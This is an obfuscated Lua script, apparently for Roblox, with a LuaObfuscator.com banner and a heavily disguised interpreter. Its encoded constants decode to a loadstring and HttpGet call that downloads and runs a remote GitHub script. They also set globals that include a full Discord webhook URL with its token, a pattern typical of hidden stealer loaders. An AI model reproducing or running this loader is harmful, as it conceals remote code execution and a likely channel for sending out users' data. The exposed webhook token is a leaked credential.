--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v84=0;while true do if (v84==0) then v19=v0(v3(v30,1,1));return "";end end else local v85=v2(v0(v30,16));if v19 then local v96=v5(v85,v19);v19=nil;return v96;else return v85;end end end);local function v20(v31,v32,v33) if v33 then local v86=0;local v87;while true do if (v86==(0 -0)) then v87=(v31/(2^(v32-(2 -1))))%(((880 -(282 + 595)) -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v87-(v87%1) ;end end else local v88=(570 -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v88 + v88))>=v88) and ((1638 -(1523 + 114)) + 0)) or (0 + 0 + 0) ;end end local function v21() local v34=(1044 + 21) -(68 + 222 + 775) ;local v35;while true do if ((1270 -(226 + 1044))==v34) then v35=v1(v16,v18,v18);v18=v18 + (4 -3) ;v34=1;end if (v34==(1 -0)) then return v35;end end end local function v22() local v36=957 -(892 + 65) ;local v37;local v38;while true do if (0==v36) then v37,v38=v1(v16,v18,v18 + 2 );v18=v18 + (4 -(182 -(67 + 113))) ;v36=1 -0 ;end if ((1 -0)==v36) then return (v38 * (606 -(87 + 263))) + v37 ;end end end local function v23() local v39=0 + 0 ;local v40;local v41;local v42;local v43;while true do if (((2 + 0) -1)==v39) then return (v43 * 16777216) + (v42 * (48199 + (18334 -(915 + 82)))) + (v41 * ((2879 -1862) -761)) + v40 ;end if (v39==(952 -(802 + 150))) then v40,v41,v42,v43=v1(v16,v18,v18 + 3 );v18=v18 + (10 -6) ;v39=1 -0 ;end end end local function v24() local v44=0 + (0 -0) ;local v45;local v46;local v47;local v48;local v49;local v50;while true do if (v44==(3 -0)) then if (v49==((4215 -3028) -(1069 + 118))) then if (v48==(0 -0)) then return v50 * (859 -(814 + 45)) ;else local v110=0 -0 ;while true do if (v110==(0 + 0)) then v49=1;v47=0 -0 ;break;end end end elseif (v49==(2031 + 16)) then return ((v48==(791 -(368 + 423))) and (v50 * (1/(0 -0)))) or (v50 * NaN) ;end return v8(v50,v49-(1041 -(10 + 8)) ) * (v47 + (v48/((7 -5)^(494 -(416 + 26))))) ;end if (v44==(0 -0)) then v45=v23();v46=v23();v44=(2 -1) + 0 ;end if (v44==2) then v49=v20(v46,36 -15 ,469 -(145 + 293) );v50=((v20(v46,462 -(44 + 386) )==(1487 -(998 + 488))) and  -1) or (1 + 0) ;v44=3;end if (v44==(1 + 0 + 0)) then v47=1;v48=(v20(v46,773 -(201 + 571) ,1158 -(41 + 75 + 1022) ) * ((8 -6)^(19 + 13))) + v45 ;v44=2;end end end local function v25(v51) local v52;if  not v51 then v51=v23();if (v51==(0 -0)) then return "";end end v52=v3(v16,v18,(v18 + v51) -(886 -(261 + 624)) );v18=v18 + v51 ;local v53={};for v68=1424 -(630 + 793) , #v52 do v53[v68]=v2(v1(v3(v52,v68,v68)));end return v6(v53);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v54=(function() return 0;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();local v61=(function() return;end)();while true do if (2~=v54) then else local v91=(function() return 1763 -(454 + 1309) ;end)();local v92=(function() return;end)();while true do if (v91==(0 + 0)) then v92=(function() return 0;end)();while true do if (v92==0) then v61=(function() return {};end)();for v121= #"}",v60 do local v122=(function() return 0;end)();local v123=(function() return;end)();local v124=(function() return;end)();local v125=(function() return;end)();while true do if (v122~=0) then else v123=(function() return 0 -0 ;end)();v124=(function() return nil;end)();v122=(function() return 1;end)();end if (v122~=1) then else v125=(function() return nil;end)();while true do if (0~=v123) then else local v130=(function() return 0;end)();while true do if ((0 -0)==v130) then v124=(function() return v21();end)();v125=(function() return nil;end)();v130=(function() return 1;end)();end if (v130==1) then v123=(function() return 1;end)();break;end end end if (1==v123) then if (v124== #"}") then v125=(function() return v21()~=0 ;end)();elseif (v124==(5 -3)) then v125=(function() return v24();end)();elseif (v124~= #"19(") then else v125=(function() return v25();end)();end v61[v121]=(function() return v125;end)();break;end end break;end end end v92=(function() return 286 -(134 + 151) ;end)();end if (1==v92) then v59[ #"-19"]=(function() return v21();end)();v54=(function() return 3;end)();break;end end break;end end end if (0~=v54) then else local v93=(function() return 0;end)();while true do if (v93~=(1665 -(970 + 695))) then else v55=(function() return function(v111,v112,v113) local v114=(function() return 0;end)();local v115=(function() return;end)();while true do if ((0 -0)==v114) then v115=(function() return 0;end)();while true do if (v115==0) then local v129=(function() return 1990 -(582 + 1408) ;end)();while true do if (v129==(0 -0)) then v111[v112-#"[" ]=(function() return v113();end)();return v111,v112,v113;end end end end break;end end end;end)();v56=(function() return {};end)();v93=(function() return 1;end)();end if (v93~=(1 -0)) then else v57=(function() return {};end)();v54=(function() return 1;end)();break;end end end if (v54~=1) then else local v94=(function() return 0 -0 ;end)();local v95=(function() return;end)();while true do if (0~=v94) then else v95=(function() return 1824 -(1195 + 629) ;end)();while true do if (v95~=0) then else v58=(function() return {};end)();v59=(function() return {v56,v57,nil,v58};end)();v95=(function() return 1 -0 ;end)();end if (v95~=(242 -(187 + 54))) then else v60=(function() return v23();end)();v54=(function() return 2;end)();break;end end break;end end end if (v54==3) then for v97= #",",v23() do local v98=(function() return v21();end)();if (v20(v98, #"\\", #"{")~=(780 -(162 + 618))) then else local v106=(function() return 0 + 0 ;end)();local v107=(function() return;end)();local v108=(function() return;end)();local v109=(function() return;end)();while true do if (v106~=(1 + 0)) then else local v117=(function() return 0;end)();local v118=(function() return;end)();while true do if ((0 -0)==v117) then v118=(function() return 0;end)();while true do if ((0 -0)==v118) then v109=(function() return {v22(),v22(),nil,nil};end)();if (v107==(0 + 0)) then local v133=(function() return 1636 -(1373 + 263) ;end)();local v134=(function() return;end)();while true do if (0~=v133) then else v134=(function() return 1000 -(451 + 549) ;end)();while true do if (v134==(0 + 0)) then v109[ #"xxx"]=(function() return v22();end)();v109[ #".com"]=(function() return v22();end)();break;end end break;end end elseif (v107== #"|") then v109[ #"-19"]=(function() return v23();end)();elseif (v107==(2 -0)) then v109[ #"gha"]=(function() return v23() -((2 -0)^16) ;end)();elseif (v107== #"xxx") then local v339=(function() return 0;end)();local v340=(function() return;end)();while true do if (0==v339) then v340=(function() return 1384 -(746 + 638) ;end)();while true do if ((0 + 0)~=v340) then else v109[ #"-19"]=(function() return v23() -((2 -0)^(357 -(218 + 123))) ;end)();v109[ #"?id="]=(function() return v22();end)();break;end end break;end end end v118=(function() return 1582 -(1535 + 46) ;end)();end if (v118~=1) then else v106=(function() return 2 + 0 ;end)();break;end end break;end end end if (v106==(0 + 0)) then local v119=(function() return 560 -(306 + 254) ;end)();while true do if (v119==1) then v106=(function() return 1 + 0 ;end)();break;end if (v119==(0 -0)) then v107=(function() return v20(v98,2, #"19(");end)();v108=(function() return v20(v98, #"?id=",1473 -(899 + 568) );end)();v119=(function() return 1 + 0 ;end)();end end end if (v106~=(7 -4)) then else if (v20(v108, #"-19", #"nil")== #"[") then v109[ #"xnxx"]=(function() return v61[v109[ #"0313"]];end)();end v56[v97]=(function() return v109;end)();break;end if (v106==(605 -(268 + 335))) then if (v20(v108, #"\\", #"|")== #"]") then v109[292 -(60 + 230) ]=(function() return v61[v109[574 -(426 + 146) ]];end)();end if (v20(v108,1 + 1 ,1458 -(282 + 1174) )~= #"<") then else v109[ #"xxx"]=(function() return v61[v109[ #"91("]];end)();end v106=(function() return 814 -(569 + 242) ;end)();end end end end for v99= #" ",v23() do v57,v99,v28=(function() return v55(v57,v99,v28);end)();end return v59;end end end local function v29(v62,v63,v64) local v65=v62[2 -1 ];local v66=v62[1 + 1 ];local v67=v62[1027 -((2565 -(821 + 1038)) + 318) ];return function(...) local v70=v65;local v71=v66;local v72=v67;local v73=v27;local v74=1252 -(721 + 530) ;local v75= -(1272 -(945 + 326));local v76={};local v77={...};local v78=v12("#",...) -(1 + 0) ;local v79={};local v80={};for v89=0,v78 do if ((2624<4557) and (v89>=v72)) then v76[v89-v72 ]=v77[v89 + 1 + 0 ];else v80[v89]=v77[v89 + (701 -(271 + 429)) ];end end local v81=(v78-v72) + 1 + 0 ;local v82;local v83;while true do local v90=(0 -0) + 0 ;while true do if ((v90==(1500 -(1408 + 11 + 81))) or (3131>3542)) then v82=v70[v74];v83=v82[1 -0 ];v90=1087 -(461 + 625) ;end if (v90==(1289 -(993 + 295))) then if (v83<=(2 + 29)) then if (v83<=(1799 -(214 + 1570))) then if ((v83<=(1178 -(418 + 753))) or (3105==4881)) then if ((2577>=1578) and (v83<=(2 + 1))) then if (v83<=(1 + 0)) then if ((v83==(0 + 0)) or (1887>4878)) then v80[v82[1 + 1 ]]=v82[532 -(152 + 254 + 123) ];else v80[v82[1771 -(1749 + 20) ]]();end elseif (v83>(1 + 1)) then local v137=v82[1324 -(1249 + (180 -107)) ];local v138=v80[v137 + 1 + 1 ];local v139=v80[v137] + v138 ;v80[v137]=v139;if (v138>(0 -(1026 -(834 + 192)))) then if (v139<=v80[v137 + 1 + 0 ]) then local v309=1145 -(466 + 679) ;while true do if ((v309==(0 -0)) or (4087>4116)) then v74=v82[3 + 0 ];v80[v137 + (8 -5) ]=v139;break;end end end elseif ((4103<=4571) and (v139>=v80[v137 + 1 + 0 ])) then local v310=1900 -(106 + 1794) ;while true do if ((1106<=1266) and (v310==0)) then v74=v82[1 + 2 ];v80[v137 + 1 + 2 ]=v139;break;end end end else local v141=v82[3 -1 ];v80[v141]=v80[v141](v13(v80,v141 + ((1 + 1) -1) ,v82[829 -(802 + 24) ]));end elseif ((v83<=(13 -8)) or (1495==4787)) then if ((v83>(118 -(4 + 110))) or (310>4434)) then v74=v82[587 -(57 + 527) ];elseif (v80[v82[1429 -(41 + 30 + 1356) ]]==v82[107 -(17 + 86) ]) then v74=v74 + 1 + 0 ;else v74=v82[1 + 2 ];end elseif ((2168<=4360) and (v83>(5 + 1))) then v80[v82[3 -1 ]][v82[8 -5 ]]=v80[v82[4]];else for v253=v82[168 -(122 + 44) ],v82[8 -5 ] do v80[v253]=nil;end end elseif (v83<=(36 -25)) then if ((994==994) and (v83<=(15 -6))) then if ((3155<4650) and (v83==(26 -18))) then v80[v82[2 + 0 ]]= #v80[v82[3 + 0 ]];else local v147=v82[1 + 1 ];local v148,v149=v73(v80[v147](v13(v80,v147 + (1 -0) ,v82[2 + 1 ])));v75=(v149 + v147) -(66 -(30 + 35)) ;local v150=0 + 0 ;for v255=v147,v75 do v150=v150 + (1258 -(1043 + 214)) ;v80[v255]=v148[v150];end end elseif (v83>(37 -(41 -14))) then if ((1655>401) and (v80[v82[1214 -(323 + 889) ]]==v82[10 -6 ])) then v74=v74 + (581 -(361 + 219)) ;else v74=v82[323 -(53 + (571 -(300 + 4))) ];end else local v151=0 + 0 ;local v152;while true do if ((3774>=1839) and (v151==(413 -(15 + 107 + 291)))) then v152=v82[328 -(192 + 134) ];v80[v152]=v80[v152](v13(v80,v152 + 1 ,v75));break;end end end elseif ((3063<=3426) and (v83<=(1289 -(316 + 960)))) then if ((1459>764) and (v83==(994 -(18 + 964)))) then local v153=v82[7 -(13 -8) ];local v154,v155=v73(v80[v153](v80[v153 + 1 + 0 ]));v75=(v155 + v153) -((363 -(112 + 250)) + 0) ;local v156=(339 + 511) -(20 + 830) ;for v258=v153,v75 do local v259=(0 -0) + 0 ;while true do if ((2811==2811) and (v259==(126 -(116 + 10)))) then v156=v156 + 1 + 0 ;v80[v258]=v154[v156];break;end end end else v80[v82[2]]=v80[v82[741 -(542 + 196) ]]%v82[4] ;end elseif ((2146>1122) and (v83==(29 -(9 + 6)))) then local v158=v82[2 -(0 + 0) ];do return v80[v158](v13(v80,v158 + 1 + 0 ,v82[2 + 1 ]));end else local v159=v82[1 + 1 ];v80[v159](v13(v80,v159 + (2 -1) ,v75));end elseif (v83<=((44 + 14) -35)) then if ((v83<=(17 + 2)) or (641>4334)) then if ((3399>=2260) and (v83<=(1568 -(1126 + 425)))) then if ((v83>(421 -(59 + 59 + 287))) or (393>=4242)) then do return;end else local v160=v71[v82[3]];local v161;local v162={};v161=v10({},{__index=function(v260,v261) local v262=0 + 0 ;local v263;while true do if (v262==0) then v263=v162[v261];return v263[3 -2 ][v263[1123 -(118 + 1003) ]];end end end,__newindex=function(v264,v265,v266) local v267=v162[v265];v267[1415 -(1001 + 413) ][v267[5 -3 ]]=v266;end});for v269=378 -(142 + 235) ,v82[2 + 2 ] do local v270=0 -0 ;local v271;while true do if (((1 + 0)==v270) or (56==3616)) then if (v271[978 -(553 + 424) ]==(90 -42)) then v162[v269-(1 + 0) ]={v80,v271[2 + 1 ]};else v162[v269-(1 + 0) ]={v63,v271[6 -3 ]};end v79[ #v79 + 1 + 0 ]=v162;break;end if (v270==(95 -(51 + 44))) then v74=v74 + 1 + 0 ;v271=v70[v74];v270=4 -(605 -(512 + 90)) ;end end end v80[v82[755 -(239 + 514) ]]=v29(v160,v161,v64);end elseif ((v83==(7 + 11)) or (2421<622)) then local v164=1329 -(797 + 532) ;local v165;while true do if ((989<4859) and (v164==(0 + 0))) then v165=v82[2];v80[v165]=v80[v165](v13(v80,v165 + 1 + 0 ,v82[(1912 -(1665 + 241)) -(720 -(373 + 344)) ]));break;end end else for v272=v82[5 -3 ],v82[1205 -(169 + 204 + 829) ] do v80[v272]=nil;end end elseif (v83<=(752 -(476 + 68 + 187))) then if ((v83>(1150 -(369 + 761))) or (4795<949)) then v80[v82[2 + 0 ]]=v64[v82[7 -4 ]];else v80[v82[2 -0 ]]=v80[v82[5 -2 ]][v82[242 -((108 -44) + 174) ]];end elseif ((3842==3842) and (v83==((1103 -(35 + 1064)) + 18))) then local v170=0 -(0 + 0) ;local v171;while true do if ((1747<=3601) and (v170==(336 -((307 -163) + 192)))) then v171=v82[218 -(42 + 174) ];do return v13(v80,v171,v75);end break;end end else v74=v82[3 + 0 ];end elseif ((v83<=(23 + 4)) or (804>4359)) then if (v83<=(11 + 14)) then if (v83==(1528 -(363 + 1141))) then local v173=158 -(91 + 67) ;local v174;while true do if (v173==(1580 -(1183 + 397))) then v174=v82[5 -3 ];v80[v174]=v80[v174](v13(v80,v174 + (2 -1) ,v75));break;end end else local v175=0 + 0 + 0 ;local v176;local v177;local v178;local v179;while true do if (v175==(1 + 0)) then v75=(v178 + v176) -(1 + 0) ;v179=1975 -(1913 + 62) ;v175=2 + (1236 -(298 + 938)) ;end if (v175==(2 + 0)) then for v316=v176,v75 do local v317=(1259 -(233 + 1026)) -0 ;while true do if ((4670>=3623) and (v317==0)) then v179=v179 + ((3600 -(636 + 1030)) -(565 + 1368)) ;v80[v316]=v177[v179];break;end end end break;end if ((2065<2544) and (v175==(0 -0))) then v176=v82[1663 -(1477 + 184) ];v177,v178=v73(v80[v176](v13(v80,v176 + (1 -0) ,v75)));v175=1 + 0 ;end end end elseif ((1311<=3359) and (1009<=1130) and (v83>(882 -(564 + 292)))) then local v180=v82[34 -(19 + 13) ];local v181=v80[v82[4 -1 ]];v80[v180 + (1 -0) ]=v181;v80[v180]=v181[v82[11 -7 ]];else v80[v82[306 -(244 + 60) ]]();end elseif (v83<=(23 + 6)) then if (v83>(504 -(41 + 435))) then v80[v82[2 + 0 ]][v80[v82[1004 -(938 + 63) ]]]=v82[4 + 0 + 0 ];else local v187=v82[1127 -(936 + 57 + 132) ];local v188,v189=v73(v80[v187](v80[v187 + 1 + 0 ]));v75=(v189 + v187) -(2 -1) ;local v190=1613 -(106 + 1459 + 48) ;for v274=v187,v75 do v190=v190 + 1 + 0 ;v80[v274]=v188[v190];end end elseif ((2758<2980) and (v83>(1168 -(782 + 356)))) then v80[v82[2 + (221 -(55 + 166)) ]]=v82[270 -(176 + 18 + 73) ];else local v193=v82[4 -2 ];do return v13(v80,v193,v75);end end elseif (v83<=(122 -75)) then if (v83<=(10 + 29)) then if ((2717<=3156) and (v83<=(51 -16))) then if (v83<=((114 + 1011) -(975 + 117))) then if ((1081<4524) and (v83==(20 + 12))) then v80[v82[1877 -((599 -442) + (2015 -(36 + 261))) ]]=v80[v82[3]] + v82[1100 -(709 + 387) ] ;else v80[v82[(3252 -1392) -(673 + 1185) ]][v80[v82[8 -5 ]]]=v80[v82[4 + 0 ]];end elseif ((v83>34) or (86>=3626)) then if  not v80[v82[2 -0 ]] then v74=v74 + (3 -(1370 -(34 + 1334))) ;else v74=v82[10 -7 ];end else local v197=v82[2];v80[v197](v13(v80,v197 + 1 + 0 ,v75));end elseif ((440>=71) and (2395==2395) and (v83<=(1055 -(697 + 321)))) then if (v83==(97 -61)) then v80[v82[(2 + 1) -1 ]]=v64[v82[3]];else local v200=0 -0 ;local v201;local v202;local v203;while true do if (v200==(0 + 0)) then v201=v82[3 -1 ];v202=v80[v201];v200=(2 + 0) -1 ;end if ((4934>2607) and (3780>2709) and (v200==(1228 -(322 + (2188 -(1035 + 248)))))) then v203=v80[v201 + (613 -(602 + 9)) ];if ((v203>(1189 -(449 + 740))) or (237>=2273) or (1400>3116)) then if (v202>v80[v201 + (3 -2) ]) then v74=v82[(896 -(20 + 1)) -(826 + 46) ];else v80[v201 + 2 + 1 ]=v202;end elseif (v202<v80[v201 + (948 -(245 + 702)) ]) then v74=v82[9 -6 ];else v80[v201 + 1 + 2 ]=v202;end break;end end end elseif (v83>(1936 -(260 + 1638))) then v80[v82[442 -(382 + 58) ]]=v80[v82[9 -6 ]];else v80[v82[(321 -(134 + 185)) + 0 ]]= #v80[v82[(1138 -(549 + 584)) -2 ]];end elseif (v83<=(127 -84)) then if (v83<=(1246 -(902 + 303))) then if ((v83>(87 -47)) or (2040<=703)) then v80[v82[4 -(687 -(314 + 371)) ]]={};else local v208=0 + 0 ;local v209;local v210;while true do if (v208==(1 + 0)) then v80[v209 + (1691 -(1121 + 569)) ]=v210;v80[v209]=v210[v82[4]];break;end if (v208==(214 -(22 + (659 -467)))) then v209=v82[685 -(483 + 200) ];v210=v80[v82[3 + 0 ]];v208=(2432 -(478 + 490)) -(1404 + 59) ;end end end elseif ((3279<=3967) and (v83==(12 + 10 + 20))) then v80[v82[5 -3 ]]=v80[v82[3 -(1172 -(786 + 386)) ]]%v82[4] ;elseif  not v80[v82[2 -(0 -0) ]] then v74=v74 + (766 -(468 + 297)) ;else v74=v82[670 -((1468 -(1055 + 324)) + 578) ];end elseif ((v83<=(33 + 12)) or (1988==877)) then if ((525<1662) and (v83>(606 -(334 + 228)))) then v80[v82[2]]=v63[v82[(2392 -(1093 + 247)) -(572 + 477) ]];else v80[v82[1 + 1 + 0 ]]=v80[v82[10 -7 ]] + v82[8 -(1 + 3) ] ;end elseif (v83==(182 -136)) then do return;end else v80[v82[1 + 1 ]][v80[v82[5 -2 ]]]=v82[2 + (6 -4) ];end elseif ((4291>1912) and (v83<=(291 -(141 + 95)))) then if (((2003<2339) and (v83<=(51 + 0))) or (876>2550)) then if (v83<=(125 -76)) then if (v83>(115 -67)) then local v217=v82[1335 -((1721 -1116) + 728) ];local v218,v219=v73(v80[v217](v13(v80,v217 + 1 + 0 ,v75)));v75=(v219 + v217) -(2 -1) ;local v220=0 + 0 ;for v277=v217,v75 do local v278=0 + 0 ;while true do if (v278==(0 -0)) then v220=v220 + 1 + 0 ;v80[v277]=v218[v220];break;end end end else v80[v82[165 -(92 + 71) ]]=v80[v82[2 + (2 -1) ]];end elseif (v83==((30 + 54) -34)) then v80[v82[767 -(574 + (735 -544)) ]]={};else v80[v82[2 + 0 ]]=v80[v82[7 -4 ]]%v80[v82[(6 -4) + 2 ]] ;end elseif (v83<=(28 + 25)) then if ((432==432) and (v83==(901 -(254 + 595)))) then v80[v82[2]]=v80[v82[129 -(55 + 71) ]]%v80[v82[5 -1 ]] ;else v80[v82[1792 -(573 + 1217) ]]=v82[8 -(4 + 1) ] + v80[v82[1 + 3 ]] ;end elseif ((v83>(86 -32)) or (1145>=1253)) then v80[v82[5 -3 ]]=v82[(2408 -1466) -(714 + 225) ] + v80[v82[(699 -(364 + 324)) -7 ]] ;else v80[v82[2 -0 ]]=v80[v82[656 -(232 + 421) ]][v82[1 + 3 ]];end elseif (v83<=(84 -25)) then if (v83<=(863 -(118 + 688))) then if ((219<=2456) and (3418>2118) and (v83>(104 -(25 + 23)))) then v80[v82[2]][v82[608 -(316 + 289) ]]=v80[v82[10 -6 ]];else v80[v82[1 + 1 ]][v80[v82[1889 -(927 + 959) ]]]=v80[v82[13 -9 ]];end elseif ((3066<=3890) and (v83==(790 -(16 + 716)))) then local v234=0 -0 ;local v235;local v236;local v237;while true do if (v234==(97 -(11 + 86))) then v235=v82[4 -2 ];v236=v80[v235 + (287 -(175 + 110)) ];v234=1;end if (v234==(2 -1)) then v237=v80[v235] + v236 ;v80[v235]=v237;v234=4 -2 ;end if ((v234==(9 -7)) or (2998>=3281)) then if ((v236>(1796 -((1378 -875) + 1293))) or (4219==1150)) then if (v237<=v80[v235 + (2 -1) ]) then local v353=0 + 0 ;while true do if ((v353==(0 + (0 -0))) or (4649<=2632)) then v74=v82[1064 -(810 + 251) ];v80[v235 + 1 + 2 ]=v237;break;end end end elseif (v237>=v80[v235 + 1 + 0 ]) then v74=v82[1 + 2 ];v80[v235 + 3 + 0 ]=v237;end break;end end else local v238=533 -(43 + 490) ;local v239;while true do if ((733 -(711 + 22))==v238) then v239=v82[7 -5 ];do return v80[v239](v13(v80,v239 + (860 -(240 + 619)) ,v82[1 + 2 ]));end break;end end end elseif (v83<=(96 -35)) then if (v83==(4 + 56)) then local v240=v82[(395 + 796) -(442 + 747) ];local v241,v242=v73(v80[v240](v13(v80,v240 + (1745 -(1344 + (1673 -1273))) ,v82[408 -(255 + 150) ])));v75=(v242 + v240) -(1 + 0) ;local v243=0 + 0 ;for v279=v240,v75 do local v280=0 -0 ;while true do if (v280==(0 + 0)) then v243=v243 + (3 -2) ;v80[v279]=v241[v243];break;end end end else local v244=1739 -((646 -242) + 1335) ;local v245;local v246;local v247;while true do if (v244==(408 -(183 + (677 -454)))) then for v322=1 -0 ,v82[3 + 1 ] do local v323=0 + 0 ;local v324;while true do if ((v323==((1606 -(1249 + 19)) -(10 + 327))) or (3860>4872)) then if ((v324[1 -(0 + 0) ]==(34 + 14)) or (3998==2298)) then v247[v322-(1481 -(641 + 839)) ]={v80,v324[3]};else v247[v322-(2 -1) ]={v63,v324[2 + 1 ]};end v79[ #v79 + (4 -3) ]=v247;break;end if (v323==((5811 -4318) -(711 + (1868 -(686 + 400))))) then v74=v74 + (1 -0) ;v324=v70[v74];v323=470 -(270 + 199) ;end end end v80[v82[1 + 1 ]]=v29(v245,v246,v64);break;end if (v244==(3 -2)) then v247={};v246=v10({},{__index=function(v325,v326) local v327=v247[v326];return v327[1820 -(580 + 1239) ][v327[2 + 0 ]];end,__newindex=function(v328,v329,v330) local v331=739 -(396 + 343) ;local v332;while true do if ((v331==(0 + 0)) or (8>=2739)) then v332=v247[v329];v332[1478 -(29 + 1448) ][v332[5 -3 ]]=v330;break;end end end});v244=2 + 0 ;end if ((2590==2590) and ((0 + 0)==v244)) then v245=v71[v82[13 -10 ]];v246=nil;v244=1 + 0 ;end end end elseif ((v83>(1589 -(389 + (1367 -(73 + 156))))) or (82>=1870)) then local v248=v82[4 -2 ];local v249=v80[v248];local v250=v80[v248 + 2 + 0 ];if ((v250>(1167 -(645 + 3 + 519))) or (2989<=222)) then if (v249>v80[v248 + (1791 -(1010 + 780)) ]) then v74=v82[3 + 0 ];else v80[v248 + (14 -11) ]=v249;end elseif ((2258>1241) and (v249<v80[v248 + ((813 -(721 + 90)) -1) ])) then v74=v82[1839 -(1045 + 791) ];else v80[v248 + (7 -4) ]=v249;end else v80[v82[(1 + 1) -(0 -0) ]]=v63[v82[508 -((821 -(224 + 246)) + 154) ]];end v74=v74 + (1575 -((2075 -794) + (539 -246))) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!1B3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q00104003073Q000176A7B61F397803053Q00705613C5DE026Q000840030A3Q001B2F40D1F4AF5C0F311303073Q0030764272B69BCB027Q004003083Q0089352B04B227231303043Q0076DC464E028Q00026Q00F03F030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403493Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F496D4469676974616C7A2F4D6F7269536372697074732F6D61696E2F4D6F72695363726970747303023Q005F4703793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31333135333634352Q363137353139313034302F2D5A6F74576B427870674A69354B5F3137307747533132727157666C4C556A5367485F68765A4C336F794B3771556F5456366355597A514E5F533175474256674E544E54004B4Q00327Q001224000100013Q002014000100010002001224000200013Q002014000200020003001224000300013Q002014000300030004001224000400053Q00062B0004000B000100010004053Q000B0001001224000400063Q002014000500040007001224000600083Q002014000600060009001224000700083Q00201400070007000A00061000083Q000100062Q00303Q00074Q00303Q00014Q00303Q00054Q00303Q00024Q00303Q00034Q00303Q00064Q0027000900083Q00122Q000A000C3Q00122Q000B000D4Q00120009000B00020010393Q000B00092Q0027000900083Q00122Q000A000F3Q00122Q000B00104Q00120009000B00020010393Q000E00092Q0027000900083Q00122Q000A00123Q00122Q000B00134Q00120009000B00020010393Q0011000900122Q000900144Q0013000A000A3Q00260B00090028000100140004053Q0028000100122Q000A00143Q00260B000A0035000100150004053Q00350001001224000B00163Q001224000C00173Q002028000C000C001800122Q000E00194Q0009000C000E4Q0018000B3Q00022Q0001000B000100010004053Q004A000100260B000A002B000100140004053Q002B000100122Q000B00143Q00260B000B003C000100150004053Q003C000100122Q000A00153Q0004053Q002B000100260B000B0038000100140004053Q00380001001224000C001A3Q002014000D3Q0011002014000E3Q000E2Q0021000C000D000E001224000C001A3Q002014000D3Q000B00202F000C000D001B00122Q000B00153Q0004053Q003800010004053Q002B00010004053Q004A00010004053Q002800012Q00113Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q003200025Q00122Q000300014Q002600045Q00122Q000500013Q00043F0003002100012Q002D00076Q0027000800024Q002D000900014Q002D000A00024Q002D000B00034Q002D000C00044Q0027000D6Q0027000E00063Q00202C000F000600012Q0009000C000F4Q0018000B3Q00022Q002D000C00034Q002D000D00044Q0027000E00014Q0026000F00014Q0033000F0006000F001037000F0001000F2Q0026001000014Q003300100006001000103700100001001000202C0010001000012Q0009000D00104Q0019000C6Q0018000A3Q000200202A000A000A00022Q000C0009000A4Q000F00073Q000100043A0003000500012Q002D000300054Q0027000400024Q003B000300044Q001600036Q00113Q00017Q00",v9(),...);
